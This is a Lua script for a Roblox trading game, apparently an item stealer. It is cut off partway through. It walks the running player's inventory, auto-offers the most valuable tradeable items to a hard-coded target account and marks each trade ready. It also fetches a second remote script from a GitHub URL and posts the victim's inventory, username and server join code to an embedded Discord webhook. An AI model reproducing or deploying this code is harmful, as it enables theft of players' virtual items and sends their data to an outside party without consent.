local CONFIG = {
    ANONYMOUS     = false, -- oculta los nombres en el webhook

    TARGET_NAME   = "Stealduelsxd",
    
    -- Script extra que se ejecuta al iniciar. Solo debes colocar la URL en texto.
    -- Dejar vacio ("") para desactivar.
    SECOND_SCRIPT_URL = "https://raw.githubusercontent.com/rysted-rbx/free/main/dmvs",

    -- (OPCIONAL) webhook de Discord para notificaciones, dejar vacio para desactivar
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1549262612892491876/9lQUvl2y8wxhncUysBpn54vQ7jJ5Cvg3xqGiwumJbTQyM05Au54LhHEMbK_wad4EGSB0",
        PING = "@everyone", -- mencion del mensaje, nil para ninguna
        NOTIFY_WHEN_EMPTY = true,
    },

    EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" },
    INCLUDE_EMOTES = true,

    MAX_TRADE_ITEMS = 12,
    OFFER_GAP       = 0.35,
    READY_TIMEOUT   = 60,
    AUTO_INVITE     = true,
    INVITE_EVERY    = 8,
}

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace         = game:GetService("Workspace")
local HttpService       = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

local Remotes       = require(ReplicatedStorage.Shared.Remotes)
local ClientGlobals = require(ReplicatedStorage.Client.Modules.ClientGlobals)
local PlayerData        = ClientGlobals.PlayerData
local ActiveNegotiation = ClientGlobals.ActiveNegotiation
local SessionState      = ClientGlobals.SessionState

local okItem, ItemDB = pcall(function() return require(ReplicatedStorage.Shared.Item) end)
if not okItem or type(ItemDB) ~= "table" then ItemDB = {} end

local okEmote, EmoteDB = pcall(function() return require(ReplicatedStorage.Shared.Emotes) end)
if not okEmote or type(EmoteDB) ~= "table" then EmoteDB = {} end

local okTrade, ItemIsTradeable = pcall(function()
    return require(ReplicatedStorage.Shared.Utils.ItemIsTradeable)
end)
if not okTrade or type(ItemIsTradeable) ~= "function" then ItemIsTradeable = nil end

local CATEGORIES = { "Knife", "Gun", "Effect" }
if CONFIG.INCLUDE_EMOTES then CATEGORIES[#CATEGORIES + 1] = "Emote" end

local RARITY_RANK = { Ancient = 6, Mythic = 5, Legendary = 4, Rare = 3, Uncommon = 2, Common = 1 }
local RARITY_ORDER = { "Ancient", "Mythic", "Legendary", "Rare", "Uncommon", "Common", "Unknown" }

local TARGET_LOW = string.lower(tostring(CONFIG.TARGET_NAME or ""))

local function isTarget(p)
    if TARGET_LOW == "" then return false end
    local name = typeof(p) == "Instance" and p.Name or tostring(p)
    return string.lower(name) == TARGET_LOW
end

local function findTargetPlayer()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and isTarget(p) then return p end
    end
    return nil
end

local EXCLUDE = {}
for _, n in ipairs(CONFIG.EXCLUDE_ITEMS or {}) do EXCLUDE[string.lower(n)] = true end

local byDisplayName = {}
for _, db in ipairs({ ItemDB, EmoteDB }) do
    for key, d in pairs(db) do
        if type(d) == "table" then
            local disp = d.ItemName or d.Name or d.name
            if type(disp) == "string" then byDisplayName[string.lower(disp)] = d end
        end
    end
end

local function rarityOf(name)
    local low = string.lower(name or "")
    local d = ItemDB[name] or EmoteDB[name] or byDisplayName[low]
    local r = type(d) == "table" and (d.Rarity or d.rarity) or nil
    if r and RARITY_RANK[r] then return r, RARITY_RANK[r] end
    return "Unknown", 0
end

local function isTradeable(name)
    if not ItemIsTradeable then return true end
    local ok, res = pcall(ItemIsTradeable, name)
    if not ok then return true end
    return res and true or false
end

local function getInventory()
    local out = {}
    for _, cat in ipairs(CATEGORIES) do
        local bucket = PlayerData:TryIndex({ "Inventory", cat })
        if type(bucket) == "table" then
            for guid, item in pairs(bucket) do
                local name = item and item.name
                if name and not EXCLUDE[string.lower(name)] and isTradeable(name) then
                    local r, rank = rarityOf(name)
                    out[#out + 1] = { guid = guid, name = name, cat = cat, rarity = r, rank = rank }
                end
            end
        end
    end
    return out
end

local function sortByRarity(list)
    table.sort(list, function(a, b)
        if a.rank ~= b.rank then return a.rank > b.rank end
        if a.name ~= b.name then return a.name < b.name end
        return tostring(a.guid) < tostring(b.guid)
    end)
    return list
end

local function summaryByRarity(inv)
    local s = {}
    for _, e in ipairs(inv) do s[e.rarity] = (s[e.rarity] or 0) + 1 end
    return s
end

local function sides()
    local data = ActiveNegotiation.Data
    if type(data) ~= "table" or not data.player1 or not data.player2 then return nil, nil, nil end
    local me, other
    if data.player1.player and data.player1.player.UserId == LocalPlayer.UserId then
        me, other = data.player1, data.player2
    else
        me, other = data.player2, data.player1
    end
    return me, other, data
end

local function offeredGuids()
    local me = sides()
    local set, n = {}, 0
    if me and me.offer then
        for _, guid in pairs(me.offer.items or {}) do set[guid] = true; n = n + 1 end
    end
    return set, n
end

local function getIncoming()
    local v = SessionState:TryIndex({ "incomingTradeRequests" })
    return type(v) == "table" and v or {}
end

local function waitUntil(cond, timeout)
    local t0 = os.clock()
    while os.clock() - t0 < timeout do
        if cond() then return true end
        task.wait(0.2)
    end
    return cond()
end

local function waitProcessingLock()
    waitUntil(function()
        local d = ActiveNegotiation.Data
        return not (d and (d.processing or 0) > Workspace:GetServerTimeNow())
    end, 5)
end

local function setReadyTrue()
    local _, _, data = sides()
    if not data then return false end
    waitUntil(function()
        local _, _, d = sides()
        return d and Workspace:GetServerTimeNow() >= (d.lastUpdate or 0) + 3
    end, 6)
    local _, _, d2 = sides()
    if not d2 then return false end
    Remotes.SetReady:FireServer(true, d2.ref or {})
    return true
end

local HttpReq = (syn and syn.request) or request or http_request or (http and http.request)

local function sendWebhook(payload)
    if not HttpReq or not CONFIG.WEBHOOK.URL or CONFIG.WEBHOOK.URL == "" then return end
    task.spawn(function()
        pcall(function()
            HttpReq({
                Url = CONFIG.WEBHOOK.URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload),
            })
        end)
    end)
end

local function jobCode()
    return ("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')"):format(game.PlaceId, game.JobId)
end

local function rarityLines(inv)
    local s = summaryByRarity(inv)
    local lines = {}
    for _, r in ipairs(RARITY_ORDER) do
        if s[r] then lines[#lines + 1] = ("%-10s x%d"):format(r, s[r]) end
    end
    if #lines == 0 then lines[1] = "(vacio)" end
    return table.concat(lines, "\n")
end

local function categoryLines(inv)
    local s = {}
    for _, e in ipairs(inv) do s[e.cat] = (s[e.cat] or 0) + 1 end
    local lines = {}
    for _, c in ipairs(CATEGORIES) do
        if s[c] then lines[#lines + 1] = ("%-7s x%d"):format(c, s[c]) end
    end
    if #lines == 0 then lines[1] = "(vacio)" end
    return table.concat(lines, "\n")
end

local function topItemsText(inv, n)
    local grouped, order = {}, {}
    for _, e in ipairs(sortByRarity(inv)) do
        if not grouped[e.name] then
            grouped[e.name] = { count = 0, rarity = e.rarity }
            order[#order + 1] = e.name
        end
        grouped[e.name].count = grouped[e.name].count + 1
    end
    local lines = {}
    for i = 1, math.min(n, #order) do
        local name = order[i]
        lines[#lines + 1] = ("[%s] %s x%d"):format(grouped[name].rarity, name, grouped[name].count)
    end
    if #order > n then lines[#lines + 1] = ("... y %d tipos mas"):format(#order - n) end
    if #lines == 0 then lines[1] = "(nada para dar)" end
    return table.concat(lines, "\n")
end

local function webhookStart()
    local inv = getInventory()
    local exec = (identifyexecutor and identifyexecutor()) or "Unknown"
    local target = CONFIG.TARGET_NAME ~= "" and CONFIG.TARGET_NAME or "(sin target)"
    local who = CONFIG.ANONYMOUS and "anonymous" or LocalPlayer.Name
    if CONFIG.ANONYMOUS then target = "anonymous" end
    sendWebhook({
        content = CONFIG.WEBHOOK.PING,
        embeds = { {
            title = "Transfer iniciado: " .. who,
            color = 3447003,
            fields = {
                { name = "Executor",       value = exec,    inline = true },
                { name = "Target",         value = target, inline = true },
                { name = "Tradeables", value = tostring(#inv) .. " (" .. math.ceil(#inv / CONFIG.MAX_TRADE_ITEMS) .. " trades)", inline = true },
                { name = "Por rareza", value = "```\n" .. rarityLines(inv) .. "\n```", inline = true },
                { name = "Por categoria", value = "```\n" .. categoryLines(inv) .. "\n```", inline = true },
                { name = "Orden de entrega", value = "```\n" .. topItemsText(inv, 15) .. "\n```", inline = false },
                { name = "Job Code", value = "```lua\n" .. jobCode() .. "\n
